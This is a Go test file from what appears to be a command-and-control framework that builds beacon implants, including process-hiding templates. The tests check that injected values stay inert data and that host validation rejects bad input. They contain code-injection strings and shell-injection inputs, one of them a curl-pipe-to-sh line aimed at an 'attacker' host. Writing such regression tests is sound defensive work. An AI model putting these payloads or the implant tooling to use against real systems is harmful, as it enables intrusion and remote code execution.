package c2

import (
	"go/ast"
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"text/template"

	"jysecai/internal/database"

	"go.uber.org/zap"
)

// renderBeaconTemplateForTest renders beacon.go.tmpl exactly the way
// payload_builder.go does, reusing the production quoting helper so the test
// cannot drift away from the code it guards.
func renderBeaconTemplateForTest(t *testing.T, data map[string]string) string {
	t.Helper()
	tmplData, err := os.ReadFile(filepath.Join("payload_templates", "beacon.go.tmpl"))
	if err != nil {
		t.Fatalf("read template: %v", err)
	}
	tmpl, err := template.New("beacon").Parse(string(tmplData))
	if err != nil {
		t.Fatalf("parse template: %v", err)
	}
	var sb strings.Builder
	if err := tmpl.Execute(&sb, quoteTemplateData(data)); err != nil {
		t.Fatalf("execute template: %v", err)
	}
	return sb.String()
}

func baseBeaconRenderData() map[string]string {
	return map[string]string{
		"ServerURL":             "http://1.2.3.4:8443",
		"ImplantToken":          "implant-token",
		"AESKeyB64":             "a2V5",
		"SleepSeconds":          "5",
		"JitterPercent":         "10",
		"CheckInPath":           "/check_in",
		"TasksPath":             "/tasks",
		"ResultPath":            "/result",
		"UploadPath":            "/upload",
		"FilePath":              "/file/",
		"UserAgent":             "Mozilla/5.0",
		"Transport":             "http",
		"TCPDialAddr":           "",
		"TransportMetadata":     "http_beacon",
		"TLSInsecureSkipVerify": "true",
	}
}

// parseGoFile parses generated Go source. The output of this template is fed to
// `go build` on the JySecAI host, so a quote inside an attacker-controlled
// field turns the remainder into code that gets compiled. A parse failure is
// the signature of that injection; a clean parse is the bar this test holds.
func parseGoFile(t *testing.T, src string) *ast.File {
	t.Helper()
	f, err := parser.ParseFile(token.NewFileSet(), "main.go", src, parser.AllErrors)
	if err != nil {
		t.Fatalf("generated source is not valid Go: %v", err)
	}
	return f
}

// constValues returns every package-level string constant in the generated file,
// with the quotes stripped. A payload that survived as inert data appears here
// verbatim; a payload that escaped its literal does not.
func constValues(t *testing.T, file *ast.File) map[string]string {
	t.Helper()
	out := map[string]string{}
	for _, decl := range file.Decls {
		gen, ok := decl.(*ast.GenDecl)
		if !ok || gen.Tok != token.CONST {
			continue
		}
		for _, spec := range gen.Specs {
			vs, ok := spec.(*ast.ValueSpec)
			if !ok {
				continue
			}
			for i, val := range vs.Values {
				lit, ok := val.(*ast.BasicLit)
				if !ok || lit.Kind != token.STRING || i >= len(vs.Names) {
					continue
				}
				s, err := strconv.Unquote(lit.Value)
				if err != nil {
					t.Fatalf("const %s is not a valid Go string literal: %v", vs.Names[i].Name, err)
				}
				out[vs.Names[i].Name] = s
			}
		}
	}
	return out
}

// TestBeaconTemplateInjectedHostStaysData is the regression guard for Go source
// injection via the C2 listener's host / token fields. The payload must end up
// as the *value* of a constant, not as code, and the file must still compile.
func TestBeaconTemplateInjectedHostStaysData(t *testing.T) {
	payloads := []string{
		`x"+fmt.Sprintf("%s","PWNED")+"x`,
		`x"; _ = 1; var y = "x`,
		`x"` + "\n" + `os.Exit(1) //`,
		`x"; go func() { exec("sh") }(); var z = "x`,
		`"; const Backdoor = "1`,
		`\"); panic("x`,
	}
	for _, payload := range payloads {
		data := baseBeaconRenderData()
		data["ServerURL"] = "http://" + payload + ":8443"

		src := renderBeaconTemplateForTest(t, data)
		file := parseGoFile(t, src)

		got := constValues(t, file)
		want := "http://" + payload + ":8443"
		if got["serverURL"] != want {
			t.Errorf("serverURL const = %q, want %q", got["serverURL"], want)
		}
		// The payload must not have introduced a new top-level declaration.
		for _, name := range []string{"Backdoor", "PWNED", "y", "z"} {
			if _, ok := got[name]; ok {
				t.Errorf("payload %q created a new const %q", payload, name)
			}
		}
	}
}

// TestBeaconTemplateInjectedFieldsStayData covers every remaining placeholder
// that receives operator-supplied data, not just ServerURL.
func TestBeaconTemplateInjectedFieldsStayData(t *testing.T) {
	payload := `a"+os.Exit(1)+"b`
	// field -> generated const name
	fields := map[string]string{
		"ImplantToken":      "implantToken",
		"UserAgent":         "userAgent",
		"CheckInPath":       "checkInPath",
		"TasksPath":         "tasksPath",
		"ResultPath":        "resultPath",
		"UploadPath":        "uploadPath",
		"FilePath":          "filePath",
		"TCPDialAddr":       "tcpDialAddr",
		"Transport":         "beaconTransport",
		"TransportMetadata": "transportMetaConst",
	}
	for field, constName := range fields {
		data := baseBeaconRenderData()
		data[field] = payload

		src := renderBeaconTemplateForTest(t, data)
		file := parseGoFile(t, src)

		if got := constValues(t, file)[constName]; got != payload {
			t.Errorf("field %s: %s const = %q, want %q", field, constName, got, payload)
		}
	}
}

// TestQuoteTemplateDataQuotesEverythingButNumbers pins the helper's contract.
// A field added to the template but forgotten here would emit a raw value.
func TestQuoteTemplateDataQuotesEverythingButNumbers(t *testing.T) {
	quoted := quoteTemplateData(map[string]string{
		"ServerURL":             `a"b`,
		"SleepSeconds":          "5",
		"JitterPercent":         "10",
		"TLSInsecureSkipVerify": "true",
		"BrandNewField":         `x"y`,
	})
	if quoted["ServerURL"] != `"a\"b"` {
		t.Errorf("ServerURL = %s, want quoted", quoted["ServerURL"])
	}
	if quoted["BrandNewField"] != `"x\"y"` {
		t.Errorf("BrandNewField = %s, want quoted", quoted["BrandNewField"])
	}
	for _, k := range []string{"SleepSeconds", "JitterPercent", "TLSInsecureSkipVerify"} {
		if quoted[k] != map[string]string{"SleepSeconds": "5", "JitterPercent": "10", "TLSInsecureSkipVerify": "true"}[k] {
			t.Errorf("%s = %q, want emitted verbatim", k, quoted[k])
		}
	}
}

func TestValidateBeaconHost(t *testing.T) {
	rejected := []string{
		`x"+fmt.Sprintf("%s","PWNED")+"x`,
		`1.2.3.4'; curl attacker/|sh; '`,
		"1.2.3.4`whoami`",
		"1.2.3.4 && id",
		"host name",
		"host$(id)",
		"",
		"-leading.example.com",
		"trailing-.example.com",
		strings.Repeat("a", 64) + ".example.com",
	}
	for _, host := range rejected {
		if err := validateBeaconHost(host); err == nil {
			t.Errorf("validateBeaconHost(%q) = nil, want error", host)
		}
	}

	accepted := []string{
		"example.com",
		"sub.domain.example.com",
		"1.2.3.4",
		"2001:db8::1",
		"[2001:db8::1]",
		"host-1.example.com",
		"example.com.",
		"my_host.example.com",
	}
	for _, host := range accepted {
		if err := validateBeaconHost(host); err != nil {
			t.Errorf("validateBeaconHost(%q) = %v, want nil", host, err)
		}
	}
}

// TestResolveBeaconDialHostRejectsInjectedOverride confirms rejection happens at
// the entry point, so an invalid value never reaches the template or the
// one-liner generators.
func TestResolveBeaconDialHostRejectsInjectedOverride(t *testing.T) {
	bad := `1.2.3.4"+os.Exit(1)+"x`
	got := ResolveBeaconDialHost(nil, bad, nil, "listener-1")
	if strings.Contains(got, "os.Exit") || strings.Contains(got, `"`) {
		t.Fatalf("injected override reached downstream: %q", got)
	}
	if got != "127.0.0.1" {
		t.Errorf("expected fallback to 127.0.0.1, got %q", got)
	}

	if got := ResolveBeaconDialHost(nil, "attacker.example.com", nil, "l"); got != "attacker.example.com" {
		t.Errorf("valid override was not honoured: %q", got)
	}
}

// TestResolveBeaconDialHostValidatesCallbackHost covers the second entry point.
// callback_host comes from the listener's config_json, so it reaches the same
// template sinks without passing through the explicitOverride argument at all.
func TestResolveBeaconDialHostValidatesCallbackHost(t *testing.T) {
	payload := `1.2.3.4"+os.Exit(1)+"x`
	listener := &database.C2Listener{
		BindHost:   "0.0.0.0",
		ConfigJSON: `{"callback_host":"` + payload + `"}`,
	}
	got := ResolveBeaconDialHost(listener, "", zap.NewNop(), "listener-1")
	if strings.Contains(got, "os.Exit") || strings.Contains(got, `"`) {
		t.Fatalf("injected callback_host reached the sink: %q", got)
	}

	ok := &database.C2Listener{
		BindHost:   "0.0.0.0",
		ConfigJSON: `{"callback_host":"cb.example.com"}`,
	}
	if got := ResolveBeaconDialHost(ok, "", zap.NewNop(), "l"); got != "cb.example.com" {
		t.Errorf("valid callback_host not honoured: %q", got)
	}
}

// TestReadTemplateFallsBackToEmbed 覆盖发行版场景：二进制旁边没有源码树。
//
// 模板原本用相对 tmplDir 读磁盘，从服务目录或计划任务启动时就找不到。这个测试
// 把 tmplDir 指到一个必定不存在的目录，逼 readTemplate 走内嵌分支 —— 三份模板
// 都要能取到，因为辅助文件只嵌 beacon 的话构建照样会失败。
func TestReadTemplateFallsBackToEmbed(t *testing.T) {
	b := NewPayloadBuilder(nil, zap.NewNop(), filepath.Join(t.TempDir(), "no-such-dir"), t.TempDir())
	for _, name := range []string{"beacon.go", "proc_hide_windows.go", "proc_hide_unix.go"} {
		data, err := b.readTemplate(name)
		if err != nil {
			t.Errorf("readTemplate(%q) 从内嵌回落失败: %v", name, err)
			continue
		}
		if len(data) == 0 {
			t.Errorf("readTemplate(%q) 返回空内容", name)
		}
	}
}

// TestReadTemplatePrefersDisk 保证开发时改完模板立即生效，不被内嵌版本盖掉。
func TestReadTemplatePrefersDisk(t *testing.T) {
	dir := t.TempDir()
	const marker = "// on-disk version"
	if err := os.WriteFile(filepath.Join(dir, "beacon.go.tmpl"), []byte(marker), 0o644); err != nil {
		t.Fatalf("write template: %v", err)
	}
	b := NewPayloadBuilder(nil, zap.NewNop(), dir, t.TempDir())
	data, err := b.readTemplate("beacon.go")
	if err != nil {
		t.Fatalf("readTemplate: %v", err)
	}
	if string(data) != marker {
		t.Errorf("磁盘上的模板未被採用: %q", string(data))
	}
}
